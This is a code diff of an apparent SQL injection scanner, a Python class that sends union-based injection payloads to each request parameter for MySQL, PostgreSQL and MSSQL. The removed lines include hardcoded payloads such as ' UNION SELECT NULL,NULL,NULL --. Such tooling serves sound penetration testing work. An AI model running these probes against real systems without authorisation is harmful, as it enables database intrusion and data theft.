@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import logging
 from typing import List, Dict, Any, Optional, Tuple
 from core.request_engine import RequestEngine
@@ -5,40 +7,126 @@ from core.payload_manager import PayloadManager
 
 class UnionBasedInjector:
     def __init__(self, request_engine: RequestEngine, payload_manager: PayloadManager):
+        """Initialize the union-based SQL injector."""
         self.request_engine = request_engine
         self.payload_manager = payload_manager
         self.column_count = None
         self.vulnerable_columns = []
         
-    def test_all_parameters(self) -> List[Dict[str, Any]]:
+    def test_all_parameters(self) -> List[Dict]:
         """Test all parameters for union-based SQL injection vulnerabilities."""
         results = []
+        params = self.request_engine.get_parameters()
         
-        # First determine the number of columns
-        self.column_count = self._determine_column_count()
-        if not self.column_count:
-            return results
-            
-        # Find vulnerable columns
-        self.vulnerable_columns = self._find_vulnerable_columns()
-        if not self.vulnerable_columns:
-            return results
-            
-        # Test MySQL union-based injection
-        mysql_results = self._test_mysql_union()
-        if mysql_results:
+        for param_name in params:
+            # Test MySQL union-based injection
+            mysql_results = self._test_mysql_union(param_name)
             results.extend(mysql_results)
             
-        # Test PostgreSQL union-based injection
-        postgres_results = self._test_postgres_union()
-        if postgres_results:
+            # Test PostgreSQL union-based injection
+            postgres_results = self._test_postgres_union(param_name)
             results.extend(postgres_results)
             
-        # Test MSSQL union-based injection
-        mssql_results = self._test_mssql_union()
-        if mssql_results:
+            # Test MSSQL union-based injection
+            mssql_results = self._test_mssql_union(param_name)
             results.extend(mssql_results)
+        
+        return results
+    
+    def _test_mysql_union(self, param_name: str) -> List[Dict]:
+        """Test for MySQL union-based SQL injection."""
+        results = []
+        payloads = self.payload_manager.get_payloads("union", "mysql")
+        
+        for payload in payloads:
+            try:
+                # Send request with payload
+                response, _ = self.request_engine.send_request(
+                    payload=payload,
+                    params={param_name: payload}
+                )
+                
+                if not response:
+                    continue
+                
+                # Check for successful union injection
+                if "UNION" in response.text and not "You have an error in your SQL syntax" in response.text:
+                    results.append({
+                        "type": "union",
+                        "parameter": param_name,
+                        "payload": payload,
+                        "severity": "high",
+                        "description": "Union-based SQL injection detected in MySQL"
+                    })
             
+            except Exception as e:
+                logging.error(f"Error testing MySQL union-based injection: {str(e)}")
+                continue
+        
+        return results
+    
+    def _test_postgres_union(self, param_name: str) -> List[Dict]:
+        """Test for PostgreSQL union-based SQL injection."""
+        results = []
+        payloads = self.payload_manager.get_payloads("union", "postgresql")
+        
+        for payload in payloads:
+            try:
+                # Send request with payload
+                response, _ = self.request_engine.send_request(
+                    payload=payload,
+                    params={param_name: payload}
+                )
+                
+                if not response:
+                    continue
+                
+                # Check for successful union injection
+                if "UNION" in response.text and not "ERROR: syntax error" in response.text:
+                    results.append({
+                        "type": "union",
+                        "parameter": param_name,
+                        "payload": payload,
+                        "severity": "high",
+                        "description": "Union-based SQL injection detected in PostgreSQL"
+                    })
+            
+            except Exception as e:
+                logging.error(f"Error testing PostgreSQL union-based injection: {str(e)}")
+                continue
+        
+        return results
+    
+    def _test_mssql_union(self, param_name: str) -> List[Dict]:
+        """Test for MSSQL union-based SQL injection."""
+        results = []
+        payloads = self.payload_manager.get_payloads("union", "mssql")
+        
+        for payload in payloads:
+            try:
+                # Send request with payload
+                response, _ = self.request_engine.send_request(
+                    payload=payload,
+                    params={param_name: payload}
+                )
+                
+                if not response:
+                    continue
+                
+                # Check for successful union injection
+                if "UNION" in response.text and not "Msg" in response.text and not "Incorrect syntax" in response.text:
+                    results.append({
+                        "type": "union",
+                        "parameter": param_name,
+                        "payload": payload,
+                        "severity": "high",
+                        "description": "Union-based SQL injection detected in MSSQL"
+                    })
+            
+            except Exception as e:
+                logging.error(f"Error testing MSSQL union-based injection: {str(e)}")
+                continue
+        
         return results
         
     def _determine_column_count(self) -> Optional[int]:
@@ -80,135 +168,6 @@ class UnionBasedInjector:
                 continue
                 
         return vulnerable_columns
-        
-    def _test_mysql_union(self) -> List[Dict[str, Any]]:
-        """Test for MySQL union-based SQL injection."""
-        results = []
-        
-        # Get all parameters from the request
-        params = self.request_engine.get_parameters()
-        
-        # Common MySQL union-based payloads
-        payloads = [
-            "' UNION SELECT 1,2,3 --",
-            "' UNION SELECT 1,2,3 #",
-            "' UNION ALL SELECT 1,2,3 --",
-            "' UNION ALL SELECT 1,2,3 #",
-            "' UNION SELECT NULL,NULL,NULL --",
-            "' UNION SELECT NULL,NULL,NULL #",
-            "' UNION ALL SELECT NULL,NULL,NULL --",
-            "' UNION ALL SELECT NULL,NULL,NULL #"
-        ]
-        
-        for param_name, param_value in params.items():
-            for payload in payloads:
-                try:
-                    # Send request with payload
-                    test_value = param_value + payload if param_value else payload
-                    response, _ = self.request_engine.send_request(params={param_name: test_value})
-                    
-                    # Check if response indicates successful injection
-                    if self._check_union_success(response):
-                        results.append({
-                            "type": "union",
-                            "parameter": param_name,
-                            "payload": payload,
-                            "status": "vulnerable",
-                            "columns": self.vulnerable_columns,
-                            "data": self._extract_union_data(response)
-                        })
-                        
-                except Exception as e:
-                    logging.error(f"Error testing MySQL union-based injection: {str(e)}")
-                    continue
-                    
-        return results
-        
-    def _test_postgres_union(self) -> List[Dict[str, Any]]:
-        """Test for PostgreSQL union-based SQL injection."""
-        results = []
-        
-        # Get all parameters from the request
-        params = self.request_engine.get_parameters()
-        
-        # Common PostgreSQL union-based payloads
-        payloads = [
-            "' UNION SELECT 1,2,3 --",
-            "' UNION SELECT 1,2,3 #",
-            "' UNION ALL SELECT 1,2,3 --",
-            "' UNION ALL SELECT 1,2,3 #",
-            "' UNION SELECT NULL,NULL,NULL --",
-            "' UNION SELECT NULL,NULL,NULL #",
-            "' UNION ALL SELECT NULL,NULL,NULL --",
-            "' UNION ALL SELECT NULL,NULL,NULL #"
-        ]
-        
-        for param_name, param_value in params.items():
-            for payload in payloads:
-                try:
-                    # Send request with payload
-                    test_value = param_value + payload if param_value else payload
-                    response, _ = self.request_engine.send_request(params={param_name: test_value})
-                    
-                    # Check if response indicates successful injection
-                    if self._check_union_success(response):
-                        results.append({
-                            "type": "union",
-                            "parameter": param_name,
-                            "payload": payload,
-                            "status": "vulnerable",
-                            "columns": self.vulnerable_columns,
-                            "data": self._extract_union_data(response)
-                        })
-                        
-                except Exception as e:
-                    logging.error(f"Error testing PostgreSQL union-based injection: {str(e)}")
-                    continue
-                    
-        return results
-        
-    def _test_mssql_union(self) -> List[Dict[str, Any]]:
-        """Test for MSSQL union-based SQL injection."""
-        results = []
-        
-        # Get all parameters from the request
-        params = self.request_engine.get_parameters()
-        
-        # Common MSSQL union-based payloads
-        payloads = [
-            "' UNION SELECT 1,2,3 --",
-            "' UNION SELECT 1,2,3 #",
-            "' UNION ALL SELECT 1,2,3 --",
-            "' UNION ALL SELECT 1,2,3 #",
-            "' UNION SELECT NULL,NULL,NULL --",
-            "' UNION SELECT NULL,NULL,NULL #",
-            "' UNION ALL SELECT NULL,NULL,NULL --",
-            "' UNION ALL SELECT NULL,NULL,NULL #"
-        ]
-        
-        for param_name, param_value in params.items():
-            for payload in payloads:
-                try:
-                    # Send request with payload
-                    test_value = param_value + payload if param_value else payload
-                    response, _ = self.request_engine.send_request(params={param_name: test_value})
-                    
-                    # Check if response indicates successful injection
-                    if self._check_union_success(response):
-                        results.append({
-                            "type": "union",
-                            "parameter": param_name,
-                            "payload": payload,
-                            "status": "vulnerable",
-                            "columns": self.vulnerable_columns,
-                            "data": self._extract_union_data(response)
-                        })
-                        
-                except Exception as e:
-                    logging.error(f"Error testing MSSQL union-based injection: {str(e)}")
-                    continue
-                    
-        return results
         
     def _check_error_response(self, response) -> bool:
         """Check if response indicates an error."""
